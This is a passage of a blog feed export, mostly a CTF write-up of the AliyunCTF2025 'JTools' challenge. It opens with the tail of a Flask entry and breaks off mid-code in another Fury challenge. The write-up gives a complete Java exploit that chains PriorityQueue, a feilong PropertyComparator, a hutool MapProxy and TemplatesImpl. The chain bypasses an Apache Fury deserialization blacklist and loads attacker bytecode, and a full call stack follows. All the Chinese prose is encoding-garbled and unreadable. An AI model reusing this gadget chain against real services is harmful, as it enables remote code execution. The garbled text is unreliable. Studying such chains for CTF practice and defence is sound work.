class="hljs-number">200</span><br><br><br><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">404</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">page_not_found</span>(<span class="hljs-params">e</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Not Found&#x27;</span>, <span class="hljs-number">404</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">21000</span>)<br></code></pre></td></tr></table></figure><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312184013283.png" alt="image-20250312184013283"></p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AliyunCTF2025-JToolsåˆ†æ</title>
    <link href="/2025/03/01/AliyunCTF2025-JTools%E5%88%86%E6%9E%90/"/>
    <url>/2025/03/01/AliyunCTF2025-JTools%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™é“é¢˜EXPä¸éš¾ç†è§£ï¼Œfuryååºåˆ—åŒ–è®©æˆ‘æƒ³èµ·ä¸€ä½æ•…äººï¼š</p><p>å»å¹´å›½èµ›ååŒ—åˆ†åŒºèµ›çš„ä¸€é“furyé¢˜ï¼Œå½“æˆ‘å¤ç°å®ŒAliyunè¿™é“é¢˜é©¬ä¸Šå°±æƒ³åˆ°äº†ååŒ—é‚£é“ï¼Œä½†æ˜¯ä¸¤ä¸ªfuryçš„é»‘åå•å…¶å®æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯Aliyunçš„åŠ äº†ä¸€ä¸ªcom.feilongï¼Œä¹Ÿæ˜¯è¿™é“é¢˜çš„çªç ´å£ï¼ŒååŒ—é‚£é“æœ‰ç‚¹æ˜¾å¾—æ— æ‡ˆå¯å‡»äº†ã€‚ã€‚ã€‚</p><p>é‚£é“é¢˜æ˜¯0è§£7ä¿®ï¼Œåº”è¯¥æ˜¯çŸ³æ²‰å¤§æµ·äº†ã€‚æœŸæœ›æœ‰ç¼˜çš„å¤§ä½¬èƒ½å°†é‚£é“é¢˜è§£å‡ºæ¥è®©æˆ‘å­¦ä¹ å­¦ä¹ å§ï¼ˆ</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>å®˜æ–¹EXPå…¶å®å†™çš„å¾ˆæ¸…æ¥šäº†ï¼Œæ‰“å¼€å°±ä¸€ä¸ªå¾ˆæ˜¾ç„¶çš„furyååºåˆ—åŒ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Server</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        HttpUtil.createServer(<span class="hljs-number">8888</span>).addAction(<span class="hljs-string">&quot;/&quot;</span>, (request, response) -&gt; &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> request.getParam(<span class="hljs-string">&quot;data&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-keyword">if</span> (data == <span class="hljs-literal">null</span>) &#123;<br>                response.write(IOReaderUtil.readToString(<span class="hljs-string">&quot;/tmp/desc.txt&quot;</span>), ContentType.TEXT_PLAIN.toString());<br>            &#125;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Fury</span> <span class="hljs-variable">fury</span> <span class="hljs-operator">=</span> Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(<span class="hljs-literal">false</span>).build();<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">deserialize</span> <span class="hljs-operator">=</span> fury.deserialize(Base64.getDecoder().decode(data));<br>                result = deserialize.toString();<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                result = e.getMessage();<br>            &#125;<br><br>            response.write(result, ContentType.TEXT_PLAIN.toString());<br>        &#125;).start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹æ¯”å®˜æ–¹çš„furyé»‘åå•ï¼Œå‘ç°æœ«å°¾æœ‰ä¸€ä¸ªæ–°çš„com.feilongï¼š</p><p><img src="/2025/03/01/AliyunCTF2025-JTools%E5%88%86%E6%9E%90/image-20250301194839339.png" alt="image-20250301194839339"></p><p>æ¥ä¸‹æ¥å°±éœ€è¦æ‰¾é“¾å­æŒ–æ˜äº†ï¼Œè¿™ä¸ªcom.feilongç›¸å½“äºæ˜¯hintäº†å§ã€‚</p><p>å®¡è®¡å¯å‘ç°ï¼Œ<code>com.feilong.core.util.comparator.PropertyComparator</code>çš„compareæ–¹æ³•å¯ä»¥è§¦å‘getterè°ƒç”¨ï¼š</p><p><img src="/2025/03/01/AliyunCTF2025-JTools%E5%88%86%E6%9E%90/image-20250301195347826.png" alt="image-20250301195347826"></p><p><img src="/2025/03/01/AliyunCTF2025-JTools%E5%88%86%E6%9E%90/image-20250301195633082.png" alt="image-20250301195633082"></p><p>ä½†æ˜¯æˆ‘æ²¡æœ‰å¤ªæ‡‚æ•´ä¸ªå®Œå…¨çš„é“¾ï¼Œå†™wpçš„ä¹Ÿæ˜¯æŠŠéš¾é¢˜ç•™ç»™äº†åšé¢˜äººï¼Œè‰è‰äº†äº‹äº†ã€‚</p><p><img src="/2025/03/01/AliyunCTF2025-JTools%E5%88%86%E6%9E%90/image-20250301200331433.png" alt="image-20250301200331433"></p><p><img src="/2025/03/01/AliyunCTF2025-JTools%E5%88%86%E6%9E%90/image-20250301200340270.png" alt="image-20250301200340270"></p><p>source&amp;sinkç›´æ¥ç”¨CCé“¾é‡Œçš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">PriorityQueue.readObject()<br>PropertyComparator.compare()<br>TemplatesImpl.getOutputProperties()<br>...åŠ è½½è‡ªå®šä¹‰å­—èŠ‚ç <br></code></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨åŠ¨æ€ä»£ç†è§¦å‘<code>MapProxy</code>çš„invokeï¼Œåˆ°è¾¾<code>BeanConverter</code>çš„jdkäºŒæ¬¡ååºåˆ—åŒ–ç‚¹ç»•è¿‡é»‘åå•ã€‚</p><p>è¿™ä¸ªæ€è·¯æˆ‘ç¡®å®é—»æ‰€æœªé—»ï¼Œç½‘ä¸Šä¹Ÿæ²¡æœ‰ç›¸å…³çš„è®°è½½ã€‚åšå‡ºè¿™é“é¢˜çš„ä¹Ÿå¥½åƒåªæœ‰ä¸‰å››ä¸ªé˜Ÿã€‚</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> exp.eddiemurphy;<br><br><span class="hljs-keyword">import</span> cn.hutool.core.map.MapProxy;<br><span class="hljs-keyword">import</span> cn.hutool.core.util.ReflectUtil;<br><span class="hljs-keyword">import</span> cn.hutool.core.util.SerializeUtil;<br><span class="hljs-keyword">import</span> com.feilong.core.util.comparator.PropertyComparator;<br><span class="hljs-keyword">import</span> com.feilong.lib.digester3.ObjectCreationFactory;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.fury.Fury;<br><span class="hljs-keyword">import</span> org.apache.fury.config.Language;<br><br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">///templates</span><br><br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Exp.class.getResourceAsStream(<span class="hljs-string">&quot;Evil.class&quot;</span>);<br>        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[inputStream.available()];<br>        inputStream.read(bytes);<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">tmpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(tmpl, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(tmpl, <span class="hljs-string">&quot;hello&quot;</span>);<br><br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">tmpl1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes1</span> <span class="hljs-operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes1.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes1.set(tmpl1, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name1</span> <span class="hljs-operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name1.setAccessible(<span class="hljs-literal">true</span>);<br>        name1.set(tmpl1, <span class="hljs-string">&quot;hello2&quot;</span>);<br>        <span class="hljs-comment">///templates</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">prop</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;digester&quot;</span>;<br>        <span class="hljs-type">PropertyComparator</span> <span class="hljs-variable">propertyComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PropertyComparator</span>(prop);<br>        <span class="hljs-type">Fury</span> <span class="hljs-variable">fury</span> <span class="hljs-operator">=</span> Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(<span class="hljs-literal">false</span>).build();<br>        <span class="hljs-comment">////jdk</span><br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">templatesImpl1</span> <span class="hljs-operator">=</span> tmpl1;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> tmpl;<br><br>        <span class="hljs-type">PropertyComparator</span> <span class="hljs-variable">propertyComparator1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PropertyComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, propertyComparator1);<br>        ReflectUtil.setFieldValue(priorityQueue1, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>);<br>        Object[] objectsjdk = &#123;templatesImpl1, templatesImpl&#125;;<br>        setFieldValue(priorityQueue1, <span class="hljs-string">&quot;queue&quot;</span>, objectsjdk);<br>        <span class="hljs-comment">/////jdk</span><br><br>        <span class="hljs-type">byte</span>[] data = SerializeUtil.serialize(priorityQueue1);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">hashmap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashmap.put(prop, data);<br><br>        <span class="hljs-type">MapProxy</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MapProxy</span>(hashmap);<br>        <span class="hljs-type">ObjectCreationFactory</span>  <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> (ObjectCreationFactory) Proxy.newProxyInstance(ObjectCreationFactory.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;ObjectCreationFactory.class&#125;, mapProxy);<br>        <span class="hljs-type">ObjectCreationFactory</span>  <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> (ObjectCreationFactory) Proxy.newProxyInstance(ObjectCreationFactory.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;ObjectCreationFactory.class&#125;, mapProxy);<br><br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, propertyComparator);<br>        ReflectUtil.setFieldValue(priorityQueue, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>);<br>        Object[] objects = &#123;test, test1&#125;;<br>        setFieldValue(priorityQueue, <span class="hljs-string">&quot;queue&quot;</span>, objects);<br><br>        <span class="hljs-type">byte</span>[] serialize = fury.serialize(priorityQueue);<br>        System.out.println(Base64.getEncoder().encodeToString(serialize));<br><br>        <span class="hljs-comment">//Object deserialize = fury.deserialize(serialize);</span><br>        <span class="hljs-comment">//String result = deserialize.toString();</span><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶å®çœ‹å®Œæ•´çš„EXPè¿˜æ˜¯æ¯”è¾ƒæœ‰é€»è¾‘çš„ï¼Œä¸¤æ¬¡ååºåˆ—åŒ–æŠŠæ¶æ„å­—èŠ‚ç çš„æ€æ‹›è—åˆ°äº†èµ‹æœ‰<code>outputProperties</code>çš„<code>priorityQueue</code>ï¼Œåºåˆ—åŒ–ä¹‹åå†å¥—äº†ä¸€ä¸ªfuryåºåˆ—åŒ–æ¥ä½¿å¾—æœ€åˆçš„é»‘åå•æ£€æµ‹å¤±æ•ˆï¼Œåªä¸è¿‡<code>digester</code>çš„å¯»æ‰¾ç¡®å®éœ€è¦ä¸€å®šçš„æ—¶é—´å’Œè°ƒè¯•äº†ã€‚</p><p><img src="/2025/03/01/AliyunCTF2025-JTools%E5%88%86%E6%9E%90/image-20250301200949465.png" alt="image-20250301200949465"></p><p>é¢˜ç›®æ˜¯ä¸å‡ºç½‘çš„ï¼Œè¿™é‡Œç”±äºæ²¡springå•¥çš„ä¾èµ–æ‰€ä»¥æ‰“å†…å­˜é©¬æœ‰ç‚¹å›°éš¾ï¼Œä½†æ˜¯é¢˜ç›®è´´å¿ƒçš„ç»™äº†ä¸€ä¸ªè¯»å–<code>/tmp/desc.txt</code>çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆç›´æ¥è¦†ç›–è¯»æ–‡ä»¶å°±å¯ä»¥äº†ï¼š</p><p><img src="/2025/03/01/AliyunCTF2025-JTools%E5%88%86%E6%9E%90/image-20250301201205535.png" alt="image-20250301201205535"></p><p>è°ƒç”¨æ ˆï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java">getOutputProperties:<span class="hljs-number">506</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method (java.lang.reflect)<br>invokeMethod:<span class="hljs-number">1922</span>, PropertyUtilsBean (com.feilong.lib.beanutils) [<span class="hljs-number">2</span>]<br>getSimpleProperty:<span class="hljs-number">1095</span>, PropertyUtilsBean (com.feilong.lib.beanutils)<br>getSimpleProperty:<span class="hljs-number">1079</span>, PropertyUtilsBean (com.feilong.lib.beanutils)<br>getProperty:<span class="hljs-number">825</span>, PropertyUtilsBean (com.feilong.lib.beanutils)<br>getProperty:<span class="hljs-number">162</span>, PropertyUtils (com.feilong.lib.beanutils)<br>getDataUseApache:<span class="hljs-number">89</span>, PropertyValueObtainer (com.feilong.core.bean)<br>obtain:<span class="hljs-number">70</span>, PropertyValueObtainer (com.feilong.core.bean)<br>getProperty:<span class="hljs-number">577</span>, PropertyUtil (com.feilong.core.bean)<br>compare:<span class="hljs-number">430</span>, PropertyComparator (com.feilong.core.util.comparator)<br>siftDownUsingComparator:<span class="hljs-number">721</span>, PriorityQueue (java.util)<br>siftDown:<span class="hljs-number">687</span>, PriorityQueue (java.util)<br>heapify:<span class="hljs-number">736</span>, PriorityQueue (java.util)<br>readObject:<span class="hljs-number">796</span>, PriorityQueue (java.util)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method (java.lang.reflect)<br>invokeReadObject:<span class="hljs-number">1185</span>, ObjectStreamClass (java.io)<br>readSerialData:<span class="hljs-number">2345</span>, ObjectInputStream (java.io)<br>readOrdinaryObject:<span class="hljs-number">2236</span>, ObjectInputStream (java.io)<br>readObject0:<span class="hljs-number">1692</span>, ObjectInputStream (java.io)<br>readObject:<span class="hljs-number">508</span>, ObjectInputStream (java.io)<br>readObject:<span class="hljs-number">466</span>, ObjectInputStream (java.io)<br>readObj:<span class="hljs-number">615</span>, IoUtil (cn.hutool.core.io)<br>readObj:<span class="hljs-number">582</span>, IoUtil (cn.hutool.core.io)<br>readObj:<span class="hljs-number">563</span>, IoUtil (cn.hutool.core.io)<br>deserialize:<span class="hljs-number">65</span>, SerializeUtil (cn.hutool.core.util)<br>deserialize:<span class="hljs-number">594</span>, ObjectUtil (cn.hutool.core.util)<br>convertInternal:<span class="hljs-number">81</span>, BeanConverter (cn.hutool.core.convert.impl)<br>convert:<span class="hljs-number">58</span>, AbstractConverter (cn.hutool.core.convert)<br>convert:<span class="hljs-number">288</span>, ConverterRegistry (cn.hutool.core.convert)<br>convert:<span class="hljs-number">307</span>, ConverterRegistry (cn.hutool.core.convert)<br>convertWithCheck:<span class="hljs-number">765</span>, Convert (cn.hutool.core.convert)<br>convert:<span class="hljs-number">718</span>, Convert (cn.hutool.core.convert)<br>convert:<span class="hljs-number">689</span>, Convert (cn.hutool.core.convert)<br>invoke:<span class="hljs-number">147</span>, MapProxy (cn.hutool.core.map)<br>getDigester:-<span class="hljs-number">1</span>, $Proxy0 (com.sun.proxy)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method (java.lang.reflect)<br>invokeMethod:<span class="hljs-number">1922</span>, PropertyUtilsBean (com.feilong.lib.beanutils) [<span class="hljs-number">1</span>]<br>getSimpleProperty:<span class="hljs-number">1095</span>, PropertyUtilsBean (com.feilong.lib.beanutils)<br>getSimpleProperty:<span class="hljs-number">1079</span>, PropertyUtilsBean (com.feilong.lib.beanutils)<br>getProperty:<span class="hljs-number">825</span>, PropertyUtilsBean (com.feilong.lib.beanutils)<br>getProperty:<span class="hljs-number">162</span>, PropertyUtils (com.feilong.lib.beanutils)<br>getDataUseApache:<span class="hljs-number">89</span>, PropertyValueObtainer (com.feilong.core.bean)<br>obtain:<span class="hljs-number">70</span>, PropertyValueObtainer (com.feilong.core.bean)<br>getProperty:<span class="hljs-number">577</span>, PropertyUtil (com.feilong.core.bean)<br>compare:<span class="hljs-number">430</span>, PropertyComparator (com.feilong.core.util.comparator)<br>siftUpUsingComparator:<span class="hljs-number">669</span>, PriorityQueue (java.util)<br>siftUp:<span class="hljs-number">645</span>, PriorityQueue (java.util)<br>offer:<span class="hljs-number">344</span>, PriorityQueue (java.util)<br>add:<span class="hljs-number">321</span>, PriorityQueue (java.util)<br>readSameTypeElements:<span class="hljs-number">694</span>, AbstractCollectionSerializer (org.apache.fury.serializer.collection)<br>generalJavaRead:<span class="hljs-number">672</span>, AbstractCollectionSerializer (org.apache.fury.serializer.collection)<br>readElements:<span class="hljs-number">595</span>, AbstractCollectionSerializer (org.apache.fury.serializer.collection)<br>read:<span class="hljs-number">73</span>, CollectionSerializer (org.apache.fury.serializer.collection)<br>read:<span class="hljs-number">28</span>, CollectionSerializer (org.apache.fury.serializer.collection)<br>readDataInternal:<span class="hljs-number">972</span>, Fury (org.apache.fury)<br>readRef:<span class="hljs-number">865</span>, Fury (org.apache.fury)<br>deserialize:<span class="hljs-number">797</span>, Fury (org.apache.fury)<br>deserialize:<span class="hljs-number">718</span>, Fury (org.apache.fury)<br></code></pre></td></tr></table></figure><p>è¿™ç¯‡æ–‡ç« åˆ†æé“¾å­æŒºå¥½ï¼š<a href="https://mp.weixin.qq.com/s/dMl0aEg6p7w7MKlUe7pCdg?poc_token=HO5E0WejTX00WfrQI8oI22YsiTkxiEcLfLgbYyWv">AliyunCTF2025 é¢˜è§£ä¹‹ Jtools Fury ååºåˆ—åŒ–åˆ©ç”¨åˆ†æ</a></p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>æœ€åï¼Œè¿˜æ˜¯æœŸæœ›å›½èµ›ååŒ—é‚£é“furyæœ‰é«˜æ‰‹èƒ½çœ‹çœ‹æ€ä¹ˆåšï¼Œæˆ–è€…patchçš„æ–¹æ³•ä¹Ÿå¯ä»¥äº¤æµä¸€ä¸‹ã€‚</p><p>é€»è¾‘æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApiController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ApiController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">api</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(value = &quot;apistr&quot;,required = false,defaultValue = &quot;&quot;)</span> String apistr, Model model)</span> &#123;<br>        <span class="hljs-keyword">if</span> (apistr.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>            model.addAttribute(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;&#123; \&quot;id\&quot;: 1, \&quot;name\&quot;: \&quot;admin\&quot;, \&quot;age\&quot;: 21, \&quot;phone\&quot;: \&quot;13300000000\&quot; &#125;&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Fury</span> <span class="hljs-variable">fury</span> <span class="hljs-operator">=</span> Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(<span class="hljs-literal">false</span>).build();<br>                <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(apistr);<br>                <span class="hljs-type">Object</span> 